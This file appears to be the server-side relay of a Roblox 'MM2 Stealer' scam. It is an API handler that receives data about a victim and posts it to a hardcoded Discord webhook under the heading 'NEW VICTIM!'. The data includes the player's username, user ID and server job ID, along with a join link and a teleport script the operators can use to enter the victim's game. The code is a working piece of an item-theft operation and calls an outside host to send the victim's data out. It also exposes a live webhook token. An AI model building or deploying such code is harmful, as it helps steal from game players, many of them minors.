
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { hitData } = req.body;
    
    if (!hitData) {
        return res.status(400).json({ error: 'No hit data' });
    }

    // Your Discord webhook
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1506678688903598142/ogvR63l5BKj4rXumzuFpdcdAwDvW8u17XTbdL325wm5AJgQIJiTTuFefbxx7sGSeKdmb";
    
    const joinLink = `https://my-api-dusky-three.vercel.app/api/Join?jobId=${hitData.jobId}&username=${hitData.username}`;
    
    const message = `@everyone
**🎯 NEW VICTIM!**

**Player:** ${hitData.username}
**User ID:** ${hitData.robloxUserId}
**Job ID:** \`${hitData.jobId}\`

**🔗 CLICK TO JOIN (opens Roblox):**
${joinLink}

**📋 Or use this script:**
\`game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "${hitData.jobId}")\``;

    await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message, username: "MM2 Stealer" })
    });

    return res.status(200).json({ success: true });
}
      }
